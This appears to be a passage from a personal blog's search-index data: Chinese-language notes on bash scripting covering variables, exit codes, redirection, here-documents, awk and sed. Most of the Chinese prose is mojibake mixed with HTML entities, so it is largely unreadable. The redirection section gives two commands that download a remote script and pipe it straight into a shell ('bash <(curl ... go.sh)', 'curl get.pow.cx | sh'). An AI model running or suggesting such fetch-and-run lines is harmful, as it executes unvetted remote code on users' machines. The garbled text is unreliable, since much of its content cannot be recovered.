&amp;&amp; [ ! -f $EXCLUDE_DOMAIN_FILE ]; then _yellow &#39;WARNING:\\nExclude domain file does not exist, ignored.\\n\\n&#39; EXCLUDE_DOMAIN_FILE=&#39;&#39; fi } æ‡’å¾—è§£é‡Šäº†ï¼Œå°±æ˜¯ä¸€ä¸ªswitch caseå’Œå„ç§if else å˜é‡($å…¶å®å°±æ˜¯ç¾å…ƒç¬¦å·äº†)å˜é‡è°ƒç”¨ç¬¦å·($) LI=date $LI ## # Tue Dec 5 04:06:18 EST 2017 # æ‰€ä»¥ç»å¸¸ä¼šæœ‰è¿™æ ·çš„è„šæœ¬ # Check if user is root if [ $(id -u) != &quot;0&quot; ]; then echo &quot; Not the root user! Try using sudo Command ! &quot; exit 1 fi echo &quot;Pass the test! You are the root user!&quot; ## äº²æµ‹ä¸‹é¢è¿™ç§å¯ç”¨ if [ `whoami` = &quot;root&quot; ];then echo &quot;rootç”¨æˆ·ï¼&quot; else echo &quot;érootç”¨æˆ·ï¼&quot; fi ${a} å˜é‡açš„å€¼, åœ¨ä¸å¼•èµ·æ­§ä¹‰çš„æƒ…å†µä¸‹å¯ä»¥çœç•¥å¤§æ‹¬å·ã€‚$(cmd) å‘½ä»¤æ›¿æ¢ï¼Œå’Œcmdæ•ˆæœç›¸åŒï¼Œç»“æœä¸ºshellå‘½ä»¤cmdçš„è¾“å‡º$((expression)) å’Œexprexpressionæ•ˆæœç›¸åŒ, è®¡ç®—æ•°å­¦è¡¨è¾¾å¼expçš„æ•°å€¼, å…¶ä¸­expåªè¦ç¬¦åˆCè¯­è¨€çš„è¿ç®—è§„åˆ™å³å¯, ç”šè‡³ä¸‰ç›®è¿ç®—ç¬¦å’Œé€»è¾‘è¡¨è¾¾å¼éƒ½å¯ä»¥è®¡ç®—ã€‚ å˜é‡åˆ†ä¸ºç”¨æˆ·è‡ªå®šä¹‰çš„å’Œç¯å¢ƒå˜é‡ï¼ˆå…¶å®å°±æ˜¯ç³»ç»Ÿé¢„è®¾çš„ï¼‰,æœ‰äº›åŒºåˆ« ç”¨æˆ·è‡ªå®šä¹‰å˜é‡åªåœ¨å½“å‰çš„shellä¸­ç”Ÿæ•ˆï¼Œç¯å¢ƒå˜é‡åœ¨å½“å‰shellå’Œè¿™ä¸ªshellçš„æ‰€æœ‰å­shellä¸­ç”Ÿæ•ˆã€‚ç¯å¢ƒå˜é‡æ˜¯å…¨å±€å˜é‡ï¼Œç”¨æˆ·è‡ªå®šä¹‰å˜é‡æ˜¯å±€éƒ¨å˜é‡ã€‚å¯¹ç³»ç»Ÿç”Ÿæ•ˆçš„ç¯å¢ƒå˜é‡åå’Œå˜é‡ä½œç”¨æ˜¯å›ºå®šçš„ã€‚ å¸¸ç”¨çš„ç¯å¢ƒå˜é‡ HOSTNAMEï¼šä¸»æœºåSHELLï¼šå½“å‰çš„shellTREMï¼šç»ˆç«¯ç¯å¢ƒHISTSIZEï¼šå†å²å‘½ä»¤æ¡æ•°SSH_CLIENTï¼šå½“å‰æ“ä½œç¯å¢ƒæ˜¯ç”¨sshé“¾æ¥çš„ï¼Œè¿™é‡Œè®°å½•å®¢æˆ·ç«¯çš„ipSSH_TTYï¼šsshè¿æ¥çš„ç»ˆç«¯æ˜¯pts/1USER:å½“å‰ç™»å½•çš„ç”¨æˆ· echo $HOSTNAME ## unbutu $? æœ€åä¸€æ¬¡æ‰§è¡Œçš„å‘½ä»¤çš„è¿”å›çŠ¶æ€ã€‚å¦‚æœè¿™ä¸ªå˜é‡çš„å€¼ä¸º0ï¼Œè¯æ˜ä¸Šä¸€ä¸ªå‘½ä»¤æ­£ç¡®æ‰§è¡Œï¼›å¦‚æœè¿™ä¸ªå˜é‡çš„å€¼é0ï¼ˆå…·ä½“æ˜¯å“ªä¸ªæ•°ï¼Œç”±å‘½ä»¤è‡ªå·±å†³å®šï¼‰ï¼Œåˆ™è¯æ˜ä¸Šä¸€ä¸ªå‘½ä»¤æ‰§è¡Œä¸æ­£ç¡®äº†ã€‚ $$ å½“å‰è¿›ç¨‹çš„è¿›ç¨‹å·ï¼ˆPIDï¼‰ $! åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„è¿›ç¨‹å·ï¼ˆPIDï¼‰ unixä¸‹æŸ¥çœ‹ç¯å¢ƒå˜é‡å‘½ä»¤ï¼š &gt; export windowsä¸‹æŸ¥çœ‹ç¯å¢ƒå˜é‡: &gt; set è‡ªå®šä¹‰å‡½æ•°çš„è¿”å›å€¼åœ¨è‡ªå·±å†™çš„å‡½æ•°ä¸­è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸è¡Œçš„ function my_function(){ procss=`lsof -i:80` return $process } å‡½æ•°ä¸­å¯ä»¥æœ‰è¿”å›å€¼ï¼Œä½†åªèƒ½è¿”å›æ•°å­—ï¼Œå­—ç¬¦ä¸²æ˜¯ä¼šçˆ†â€numeric argument requiredâ€çš„é”™è¯¯çš„æ‰€ä»¥æƒ³è¦é€šè¿‡å‡½æ•°ç»™æŸä¸ªå˜é‡èµ‹å€¼çš„è¯ï¼Œå¯ä»¥è¿™ä¹ˆå¹² #å®šä¹‰å‡½æ•° function func(){ a=99 } #è°ƒç”¨å‡½æ•° func #å¤–éƒ¨å°±å¯ä»¥è°ƒç”¨è¿™ä¸ª echo $a å†™åœ¨å‡½æ•°ä½“ä¸­çš„å˜é‡é»˜è®¤æ˜¯å…¨å±€å˜é‡ï¼Œä½†æ˜¯è¦æ˜¯ç”¨localä¿®é¥°çš„è¯å°±ä¸èƒ½è¢«å¤–éƒ¨å¼•ç”¨ã€‚ å¦ä¸€ç§æ–¹å¼æ˜¯åœ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°ä¹‹åè·Ÿç€ä½¿ç”¨$? ç«‹é©¬è·å–ä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ shellé‡Œé¢åˆ¤æ–­ä¸€ä¸ªå‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸå…¶å®åœ¨terminalä¸­æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œæœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼šæ³¨æ„çœ‹æœ€å·¦ä¸‹æ–¹çš„ç¬¦å·ã€‚ä¸Šä¸€ä¸ªå‘½ä»¤å¦‚æœæˆåŠŸçš„è¯ï¼Œæ˜¯ç»¿è‰²çš„ï¼Œä¸æˆåŠŸçš„è¯æ˜¯çº¢è‰²çš„ã€‚cè¯­è¨€ä¸­æœ‰ä¸€ä¸ªerrornum,shell é‡Œé¢æœ‰å·®ä¸å¤šçš„ä¸œè¥¿ï¼Œç”¨äºåˆ¤æ–­ä¸Šä¸€ä¸ªå‘½ä»¤æ˜¯å¦è¿”å›é0çš„return valueã€‚ # iptables -C INPUT -p tcp --dport 8080 --jump ACCEPT iptables: Bad rule (does a matching rule exist in that chain?). # echo $? 1 # iptables -A INPUT -p tcp --dport 8080 --jump ACCEPT # iptables -C INPUT -p tcp --dport 8080 --jump ACCEPT # echo $? 0 ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œæœªæ›¾è®¾ç½®è¿™ä¸ªiptables rule ï¼Œè¿™ä¸ªå‘½ä»¤è¿”å›1 ï¼Œå¦åˆ™è¿”å›0shellé‡Œé¢åˆ¤æ–­if elseå°±å¯ä»¥è¿™ä¹ˆå†™ if [ $? -eq 0 ]; then echo &quot;no error from last command&quot; else echo &quot;some error from last command&quot; fi if [ $? != 0 ]; then echo &quot;there&#39;s error from executing last command!&quot; else echo &quot;no error from last command&quot; fi sh xxx.shå‡ºç°ä¸‹é¢è¿™ä¸ªé”™è¯¯&gt; [[: not foundâ€¦â€¦â€¦â€¦â€¦â€¦â€¦.. åŸå› æ˜¯shä¸æ”¯æŒè¿™ç§ç”¨æ³•ï¼Œbashæ”¯æŒã€‚æ‰€ä»¥æ”¹æˆbash xxx.shå°±å¯ä»¥äº† ununtué»˜è®¤çš„shä¸æ˜¯bashè€Œæ˜¯ä¸€ä¸ªå«åšdashçš„ä¸œè¥¿shåªæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œæœ€ç»ˆæŒ‡å‘æ˜¯ä¸€ä¸ªå«åšdashçš„ç¨‹åºï¼Œè‡ªUbuntu 6.10ä»¥åï¼Œç³»ç»Ÿçš„é»˜è®¤shell /bin/shè¢«æ”¹æˆäº†dashã€‚dash(the Debian Almquist shell) æ˜¯ä¸€ä¸ªæ¯”bashå°å¾ˆå¤šä½†ä»å…¼å®¹POSIXæ ‡å‡†çš„shellï¼Œå®ƒå ç”¨çš„ç£ç›˜ç©ºé—´æ›´å°‘ï¼Œæ‰§è¡Œshellè„šæœ¬æ¯”bashæ›´å¿«ï¼Œä¾èµ–çš„åº“æ–‡ä»¶æ›´å°‘ï¼Œå½“ç„¶ï¼Œåœ¨åŠŸèƒ½ä¸Šæ— æ³•ä¸bashç›¸æ¯”ã€‚dashæ¥è‡ªäºNetBSDç‰ˆæœ¬çš„Almquist Shell(ash)ã€‚Ubuntuä¸­å°†é»˜è®¤shellæ”¹ä¸ºdashçš„ä¸»è¦åŸå› æ˜¯æ•ˆç‡ã€‚ç”±äºUbuntuå¯åŠ¨è¿‡ç¨‹ä¸­éœ€è¦å¯åŠ¨å¤§é‡çš„shellè„šæœ¬ï¼Œä¸ºäº†ä¼˜åŒ–å¯åŠ¨é€Ÿåº¦å’Œèµ„æºä½¿ç”¨æƒ…å†µï¼ŒUbuntuåšäº†è¿™æ ·çš„æ”¹åŠ¨ã€‚ shellè„šæœ¬æ‰§è¡Œçš„æ—¶å€™ä¸æ˜¯å¯ä»¥å¸¦å‚æ•°$0, $1ä»€ä¹ˆçš„å˜›è¿™å®è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ•°ç»„ #!/bin/bash echo &quot;The script you are running has basename `basename &quot;$0&quot;`, dirname `dirname &quot;$0&quot;`&quot; echo &quot;The present working directory is `pwd`&quot; echo &quot;å‚æ•°ä¸ªæ•°ä¸ºï¼š$#&quot;; ## ä¼ è¿›æ¥çš„å‚æ•°çš„ä¸ªæ•° echo &quot;ä¼ é€’çš„å‚æ•°ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²æ˜¾ç¤ºï¼š$*&quot;; ## å°±æ˜¯æŠŠæ‰€æœ‰å‚æ•°ä½œä¸ºä¸€æ•´ä¸ªå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ echo &quot;-- \\$@ ä¼ å…¥çš„å‚æ•° ---&quot; for i in &quot;$@&quot;; do echo $i done åœ¨cè¯­è¨€çš„mainå‡½æ•°ä¸­,args[0]å°±æ˜¯å½“å‰æ–‡ä»¶çš„è·¯å¾„ï¼Œæ‰€ä»¥åœ¨shellé‡Œä¹Ÿå·®ä¸å¤š åœ¨shè„šæœ¬ä¸­åˆ¤æ–­å½“å‰è„šæœ¬æ‰€åœ¨çš„ä½ç½®) shellä¸­çš„é‡å®šå‘å¤§äºå·æ˜¯è¾“å‡ºé‡å®šå‘ï¼Œå°äºå·æ˜¯è¾“å…¥é‡å®šå‘ è¾“å…¥é‡å®šå‘å°±å¥½ç©äº†ç›´æ¥æŠŠä¸€ä¸ªcurlçš„è„šæœ¬å¯¼åˆ°bashå»æ‰§è¡Œçš„æ–¹å¼ - bash &lt;(curl -L -s https://install.direct/go.sh) $ curl get.pow.cx | sh ##æˆ‘ä¹Ÿè§è¿‡è¿™ç§çš„ $ wc -l &lt; users ## å‡è®¾è¿™ä¸ªusersæ–‡ä»¶é‡Œå°±ä¸¤è¡Œ 2 è®²çš„æ·±å…¥ä¸€ç‚¹ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯ä¸ª Unix/Linux å‘½ä»¤è¿è¡Œæ—¶éƒ½ä¼šæ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶ï¼šæ ‡å‡†è¾“å…¥æ–‡ä»¶(stdin)ï¼šstdinçš„æ–‡ä»¶æè¿°ç¬¦ä¸º0ï¼ŒUnixç¨‹åºé»˜è®¤ä»stdinè¯»å–æ•°æ®ã€‚æ ‡å‡†è¾“å‡ºæ–‡ä»¶(stdout)ï¼šstdout çš„æ–‡ä»¶æè¿°ç¬¦ä¸º1ï¼ŒUnixç¨‹åºé»˜è®¤å‘stdoutè¾“å‡ºæ•°æ®ã€‚æ ‡å‡†é”™è¯¯æ–‡ä»¶(stderr)ï¼šstderrçš„æ–‡ä»¶æè¿°ç¬¦ä¸º2ï¼ŒUnixç¨‹åºä¼šå‘stderræµä¸­å†™å…¥é”™è¯¯ä¿¡æ¯ã€‚å¦‚æœå¸Œæœ›å°† stdout å’Œ stderr åˆå¹¶åé‡å®šå‘åˆ° fileï¼Œå¯ä»¥è¿™æ ·å†™ï¼š $ command &gt; file 2&gt;&amp;1 ## å°è±¡ä¸­è¿™æ˜¯æŠŠ2å¯¼åˆ°1ä¸­ ##æˆ–è€… $ command &gt;&gt; file 2&gt;&amp;1 here documentHere Document æ˜¯ Shell ä¸­çš„ä¸€ç§ç‰¹æ®Šçš„é‡å®šå‘æ–¹å¼ï¼Œç”¨æ¥å°†è¾“å…¥é‡å®šå‘åˆ°ä¸€ä¸ªäº¤äº’å¼ Shell è„šæœ¬æˆ–ç¨‹åºã€‚ å®ƒçš„åŸºæœ¬çš„å½¢å¼å¦‚ä¸‹ï¼š command &lt;&lt; delimiter document delimiter å®ƒçš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ª delimiter ä¹‹é—´çš„å†…å®¹(document) ä½œä¸ºè¾“å…¥ä¼ é€’ç»™ commandã€‚(è¯´äººè¯å°±æ˜¯æœ‰æ®µå‘½ä»¤ç‰¹åˆ«é•¿ï¼Œå¡åˆ°è¿™é‡Œå¤´å°±æ–¹ä¾¿çœ‹äº†)æ³¨æ„ï¼šç»“å°¾çš„delimiter ä¸€å®šè¦é¡¶æ ¼å†™ï¼Œå‰é¢ä¸èƒ½æœ‰ä»»ä½•å­—ç¬¦ï¼Œåé¢ä¹Ÿä¸èƒ½æœ‰ä»»ä½•å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼å’Œ tab ç¼©è¿›ã€‚å¼€å§‹çš„delimiterå‰åçš„ç©ºæ ¼ä¼šè¢«å¿½ç•¥æ‰ã€‚ linux shell çš„here document ç”¨æ³• (cat &lt;&lt; EOF) :&lt;&lt;EOF æ³¨é‡Šå†…å®¹... æ³¨é‡Šå†…å®¹... æ³¨é‡Šå†…å®¹... EOF //ç»Ÿè®¡ä¸€ä¸‹è¿™ä¸ªè„šæœ¬è€—æ—¶å¤šä¹… time bash -c â€˜echo â€œheyâ€â€˜time somescript.sh shellè„šæœ¬é‡Œé¢ç»å¸¸ä¼šçœ‹åˆ°mktempå‡½æ•°ï¼Œä½œç”¨å°±æ˜¯ç¡®ä¿ç”Ÿæˆä¸€ä¸ªéšæœºå‘½åçš„æ–‡ä»¶ ä¸€è¡Œè¡Œçš„è¯»å–ä¸€ä¸ªæ–‡ä»¶#!/bin/bash file=&quot;/home/vivek/data.txt&quot; while IFS= read -r line do # display $line or do somthing with $line printf &#39;%s\\n&#39; &quot;$line&quot; done &lt;&quot;$file&quot; awkæœ‰ä¸€ä¸ªæ¯”è¾ƒå‘çš„åœ°æ–¹æ˜¯åœ¨æ‰§è¡Œå‘½ä»¤çš„è¯­å¥ä¸­åªèƒ½å†™print,printfè¿™ç§awkè‡ªå¸¦çš„å‡½æ•° echo &quot;A B C&quot; | awk &#39;{split($0,a,&quot; &quot;);for(i in a){ if(i == NF){ print a[1] } else { print a[i+1] }}}&#39; //NFæ˜¯æœ€åä¸€è¡Œçš„æ„æ€ å¾—åˆ°è¾“å‡ºBCA awkçš„å‘½ä»¤é‡Œé¢è¦æƒ³è°ƒç”¨ä¸€ä¸ªç³»ç»Ÿå‡½æ•°ï¼Œæ¯”æ–¹è¯´lsï¼Œæˆ–è€…è‡ªå·±çš„ä¸€ä¸ªshell functionï¼Œå¾—è¿™ä¹ˆå†™ awk &#39;{printf(&quot;%s &quot;,$1); system(&quot;d2h &quot; $2)}&#39; file ç›´æ¥æŒ‘é€‰å‡ ä¸ªå¯ä»¥ç”¨çš„è„šæœ¬å¼€å§‹çœ‹å§ ä¸€ä¸ªæŠŠæ–‡ä»¶å¤¹ï¼ˆ/public/imgsï¼‰ä¸‹æ‰€æœ‰æ–‡ä»¶é‡å‘½åä¸ºimg-x.jpgçš„shellè„šæœ¬ #!/bin/bash FORMAT_JPG=&quot;jpg&quot; FORMAT_JPEG=&quot;jpeg&quot; index=1 dir=$(eval pwd)/public/imgs ALLIMGES=$(ls $dir | grep &quot;.$FORMAT_JPEG\\|.$FORMAT_JPG&quot;) for file in $ALLIMGES do name=img-${index}.jpg echo renaming $dir/$file to $dir/$name mv $dir/$file $dir/$name ((index++)) # name=$(ls $file | cut -d. -f1) ##å»æ‰æ–‡ä»¶åç¼€ # mv $dir/public/imgs/$file ${name}.$suffix done echo &quot;renaming $index image files =====&gt; x.jpg done!&quot; åŒæ—¶grepå¤šç§æ–‡ä»¶çš„æ—¶å€™ï¼Œæ¯”å¦‚åˆæƒ³è¦jpgåˆæƒ³è¦jpegçš„è¯ï¼Œgrep è¦åŠ ä¸Šåæ–œæ ï¼Œæˆ–è€…ä¸‹é¢è¿™ä¸‰ç§ grep &quot;aaa\\|bbb&quot; grep -E &quot;aaa|bbb&quot; grep -E aaa\\|bbb how to grep ä¸€ä¸ªç›´æ¥æŠŠgfwlistçš„bs64æ–‡æœ¬è½¬æ¢æˆdnsmasqé…ç½®æ–‡ä»¶çš„è„šæœ¬ æ³¨æ„ï¼Œbase64åœ¨linuxä¸Šæ˜¯é¢„è£…çš„ æ£€æŸ¥å½“å‰ç³»ç»Ÿä¸­ä¾èµ–çš„è½¯ä»¶æ˜¯å¦éƒ½è£…äº†check_depends(){ which sed base64 mktemp &gt;/dev/null if [ $? != 0 ]; then ## ç¾å…ƒåŠ é—®å·å°±æ˜¯ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¿”å›å€¼ _red &#39;Error: Missing Dependency.\\nPlease check whether you have the following binaries on you system:\\nwhich, sed, base64, mktemp.\\n&#39; exit 3 fi which curl &gt;/dev/null if [ $? != 0 ]; then which wget &gt;/dev/null if [ $? != 0 ]; then _red &#39;Error: Missing Dependency.\\nEither curl or wget required.\\n&#39; exit 3 fi USE_WGET=1 ## éšä¾¿å®šä¹‰ä¸€ä¸ªå˜é‡ else USE_WGET=0 fi SYS_KERNEL=`uname -s` if [ $SYS_KERNEL = &quot;Darwin&quot; -o $SYS_KERNEL = &quot;FreeBSD&quot; ]; then ## if è¯­å¥é‡Œé¢oræ˜¯å°±æ˜¯-oï¼ŒçŸ­è·¯ä¸æ˜¯-a BASE64_DECODE=&#39;base64 -D&#39; SED_ERES=&#39;sed -E&#39; else BASE64_DECODE=&#39;base64 -d&#39; SED_ERES=&#39;sed -r&#39; fi } httpçš„getå’Œpostæ–¹æ³•åŒ…è£…ä¸€ä¸‹ç±»ä¼¼äºimportçš„è¯­æ³•å«åšsource get() { HEADER=&quot;$1&quot; URL=&quot;$2&quot; eval curl -s --connect-timeout &quot;${CONNECTION_TIME}&quot; -m &quot;${TRANSMISSION_TIME}&quot; &quot;${HEADER}&quot; &quot;${URL}&quot; } post() { HEADER=&quot;$1&quot; URL=&quot;$2&quot; PAYLOAD=&quot;$3&quot; eval curl -s --connect-timeout &quot;${CONNECTION_TIME}&quot; -m &quot;${TRANSMISSION_TIME}&quot; -X POST &quot;${URL}&quot; &quot;${HEADER}&quot; -w %{http_code} -d &quot;&#39;$PAYLOAD&#39;&quot; } ## ä½¿ç”¨æ–¹å¼ result=`get &quot;$HOST$ACCESS_URL?qosClientSn=$qosClientSn&quot; &quot;$headers&quot;` result=`post &quot;$headers&quot; &quot;$HOST$ACCESS_URL&quot; &quot;$send_data&quot;` æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶å†…å®¹æ˜¯å¦ä¸€è‡´ç›´æ¥ç”¨diff diff -q $TMP_FILE $IPSET_DATA &gt;/dev/nullif [[ $? -ne 0 ]]; then HERE DOCUMENTçš„å†™æ³•ï¼Œå°±æ˜¯æŠŠä¸€è¡Œå†™ä¸ä¸‹çš„ä¸€å¤§ä¸²æ–‡å­—echoåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­å‚è€ƒ autogen_test_libfoo_c() { cat ${LPWD}/${LICENSE_HEADER} &gt; ${TEST_LIBFOO_C} cat &gt;&gt; ${TEST_LIBFOO_C} &lt;&lt;! #include &quot;${LIBFOO_H}&quot; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char **argv) { return 0; } ! } å°±æ˜¯æŠŠä¸‹é¢é‚£ä¸€å¤§é•¿ä¸²æ–‡å­—è¿½åŠ  åˆ°TEST_LIBFOO_Cï¼Œè¿™é‡Œcatåé¢æ˜¯&gt;&gt; è€Œä¸æ˜¯&gt; ï¼Œæ‰€ä»¥æ˜¯è¿½åŠ  å¦‚æœä½ å°†è¦ç¼–å†™çš„è„šæœ¬ä¼šè¶…è¿‡100è¡Œï¼Œé‚£ä¹ˆä½ å¯èƒ½åº”è¯¥ä½¿ç”¨Pythonæ¥ç¼–å†™ï¼Œè€Œä¸æ˜¯Shellã€‚è¯·è®°ä½ï¼Œå½“è„šæœ¬è¡Œæ•°å¢åŠ ï¼Œå°½æ—©ä½¿ç”¨å¦å¤–ä¸€ç§è¯­è¨€é‡å†™ä½ çš„è„šæœ¬ï¼Œä»¥é¿å…ä¹‹åèŠ±æ›´å¤šçš„æ—¶é—´æ¥é‡å†™ã€‚ Google style guide opt-scriptshell script tutorialLINUXä¸‹çš„21ä¸ªç‰¹æ®Šç¬¦å·Shellå­¦ä¹ ç¬”è®°éå¸¸å¥½çš„shellä»‹ç»ç½‘ç«™[shellä¸­å„ç§æ‹¬å·çš„ä½œç”¨()ã€(())ã€[]ã€[]]ã€{}éå¸¸å¥½çš„æ•™ç¨‹ awesome shellè®©printfå’Œechoè¾“å‡ºå½©è‰²","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"linuxå¸¸ç”¨å‘½ä»¤(ä¸‰)","date":"2018-11-04T08:44:22.000Z","path":"2018/11/04/2018-11-04-linux-affiliated-commands/","text":"linux sedå‘½ä»¤basic sed sed operates on a stream of text that it reads from either standard input or from a file. åŸºæœ¬å‘½ä»¤æ ¼å¼sed [options] commands [file-to-edit] é»˜è®¤æƒ…å†µä¸‹,sedä¼šæŠŠç»“æœè¾“å‡ºåˆ°standoutputé‡Œé¢sed â€˜â€™ BSD ##ç­‰åŒäºcatcat BSD | sed â€˜â€™ ##æ“ä½œcatçš„è¾“å‡ºæµsed â€˜pâ€™ BSD ##pæ˜¯å‘½ä»¤ï¼Œæ˜ç¡®å‘Šè¯‰å®ƒè¦å»printï¼Œè¿™ä¼šå¯¼è‡´æ¯ä¸€è¡Œéƒ½è¢«æ‰“å°ä¸¤ésed -n â€˜pâ€™ BSD ##æˆ‘ä¸å¸Œæœ›ä½ è‡ªåŠ¨æ‰“å°ï¼Œæ¯è¡Œåªè¢«æ‰“å°ä¸€ésed -n â€˜1pâ€™ BSD ##åªæ‰“å°ç¬¬ä¸€è¡Œsed -n â€˜1,5pâ€™ BSD ##æ‰“å°å‰5è¡Œsed -n â€˜1,+4pâ€™ BSD ##è¿™ä¸ªä¹Ÿæ˜¯æ‰“å°å‰äº”è¡Œsed -n â€˜1~2pâ€™ BSD ##every other lineï¼Œæ‰“å°ä¸€è¡Œè·³è¿‡ä¸€è¡Œï¼Œä»ç¬¬ä¸€è¡Œå¼€å§‹ç®—sed â€˜1~2dâ€™ BSD ##ä¹Ÿæ˜¯éš”ä¸€è¡Œè¿›è¡Œæ“ä½œï¼Œåªä¸è¿‡è¿™é‡Œçš„dè¡¨ç¤ºåˆ é™¤ï¼Œç»“æœå°±æ˜¯1ï¼Œ3ï¼Œ5â€¦è¡Œè¢«ä»catçš„ç»“æœä¸­åˆ æ‰ é»˜è®¤æƒ…å†µä¸‹,sedä¸ä¼šä¿®æ”¹æºæ–‡ä»¶ï¼ŒåŠ ä¸Š-iå°±èƒ½æ”¹äº†sed -i â€˜1~2dâ€™ everyother.txt ##ç¬¬1ï¼Œ3ï¼Œ5ï¼Œâ€¦è¡Œè¢«åˆ æ‰sed -i.bak â€˜1~2dâ€™ everyother.txt ##åœ¨ç¼–è¾‘æ–‡ä»¶ä¹‹å‰ä¿å­˜ä¸€ä»½.bakæ–‡ä»¶ä½œä¸ºå¤‡ä»½ sedæœ€ä¸ºå¸¸ç”¨çš„å‘½ä»¤å°±æ˜¯substituting textäº†echo â€œhttp://www.example.com/index.html&quot; | sed â€˜s_com/index_org/home_â€™http://www.example.org/home.html å‘½ä»¤æ˜¯è¿™ä¹ˆç”¨çš„,é¦–å…ˆsè¡¨ç¤ºsubstituteâ€˜s/old_word/new_word/â€˜ å‡†å¤‡å¥½è¿™ä¹ˆä¸€ä»½textæ–‡ä»¶echo â€œthis is the song that never endsyes, it goes on and on, my friendsome people started singing itnot knowing what it wasand theyâ€™ll continue singing it foreverjust becauseâ€¦â€ &gt; annoying.txt sed â€˜s/on/forward/â€˜ annoying.txt ##æŠŠæ‰€æœ‰çš„onæ¢æˆforwardï¼ŒåŒæ—¶æ‰“å°å‡ºç»“æœã€‚ä½†å¦‚æœå½“å‰è¡Œå·²ç»æ›¿æ¢è¿‡ä¸€æ¬¡äº†ï¼Œå°±è·³åˆ°ä¸‹ä¸€è¡Œã€‚æ‰€ä»¥å¯èƒ½æ²¡æœ‰æ›¿æ¢å¹²å‡€ sed â€˜s/on/forward/gâ€™ annoying.txt ## åŠ ä¸Šgå°±å¥½äº†sed â€˜s/on/forward/2â€™ annoying.txt ##æ¯ä¸€è¡Œåªæ›¿æ¢ç¬¬äºŒä¸ªåŒ¹é…ä¸Šçš„sed -n â€˜s/on/forward/2pâ€™ annoying.text ## næ˜¯supressè‡ªåŠ¨printï¼Œåªæ‰“å°å‡ºå“ªäº›è¢«æ¢äº†çš„sed â€˜s/SINGING/saying/iâ€™ annoying.txt ##å¸Œæœ›å¤§å°å†™ä¸æ•æ„Ÿsed â€˜s/^.at/REPLACED/â€˜ annoying.txt ##ä»æ¯ä¸€è¡Œçš„å¼€å¤´åˆ°â€atâ€sed â€˜s/^.at/(&amp;)/â€˜ annoying.txt ## æŠŠé‚£äº›ä¼šåŒ¹é…ä¸Šçš„æ–‡å­—ç”¨æ‹¬å·åŒ…èµ·æ¥ sed -i â€˜â€™ â€œ/target text/dâ€ annoying.txt // æ‰€æœ‰åŒ…å«target textçš„è¿™ä¸€è¡Œæ–‡å­—éƒ½ä¼šè¢«åˆ æ‰ intermediate training colshellçš„æ•™ç¨‹ linuxä¸‹æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³ stat test cè¯­è¨€ä¸‹å¯¹åº”çš„å‡½æ•°åœ¨sys/stat.hå¤´æ–‡ä»¶ä¸­ #include &lt;stdio.h&gt; #include &lt;sys/stat.h&gt; int main(int argc, char const *argv[]) { struct stat filestat; stat(&quot;/etc/sysctl.conf&quot;, &amp;filestat); printf(&quot;size: %ld bytes, uid: %d, gid: %d, mode: %#o\\n&quot;, filestat.st_size, filestat.st_uid, filestat.st_gid, filestat.st_mode); return 0; } windowsçš„æ¢è¡Œç¬¦æ˜¯ \\r\\lï¼Œlinuxçš„æ˜¯ \\lï¼Œmacçš„æ˜¯ \\rä»æ ¹æœ¬ä¸Šè®²ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶å’Œæ–‡æœ¬æ–‡ä»¶åœ¨ç£ç›˜ä¸­æ²¡æœ‰åŒºåˆ«ï¼Œéƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨äºŒè¿›åˆ¶å’Œæ–‡æœ¬æ¨¡å¼çš„åŒºåˆ«åœ¨äºå¯¹æ¢è¡Œç¬¦å’Œä¸€äº›éå¯è§å­—ç¬¦çš„è½¬åŒ–ä¸Šï¼Œå¦‚éå¿…è¦ï¼Œæ˜¯ä½¿ç”¨äºŒè¿›åˆ¶è¯»å–ä¼šæ¯”è¾ƒå®‰å…¨ä¸€äº› æ¢è¡Œå’Œå›è½¦åœ¨ä¸åŒå¹³å°ä¸Šçš„è§£é‡Š Dos å’Œ windows é‡‡ç”¨â€œå›è½¦+æ¢è¡Œï¼ŒCR/LFâ€è¡¨ç¤ºä¸‹ä¸€è¡Œï¼›UNIX/Linux é‡‡ç”¨â€œæ¢è¡Œç¬¦ï¼ŒLFâ€è¡¨ç¤ºä¸‹ä¸€è¡Œï¼›è‹¹æœæœº(MAC OS ç³»ç»Ÿ)åˆ™é‡‡ç”¨â€œå›è½¦ç¬¦ï¼ŒCRâ€è¡¨ç¤ºä¸‹ä¸€è¡Œã€‚CR ç”¨ç¬¦å·â€™\\râ€™è¡¨ç¤º, åè¿›åˆ¶ASCIIä»£ç æ˜¯ 13, åå…­è¿›åˆ¶ä»£ç ä¸º 0x0D;LF ä½¿ç”¨â€™\\nâ€™ç¬¦å·è¡¨ç¤ºï¼ŒASCIIä»£ç æ˜¯ 10, åå…­åˆ¶ä¸º 0x0Aã€‚æ‰€ä»¥ Windows å¹³å°ä¸Šæ¢è¡Œåœ¨æ–‡æœ¬æ–‡ä»¶ä¸­æ˜¯ä½¿ç”¨ 0d 0a ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œè€Œ 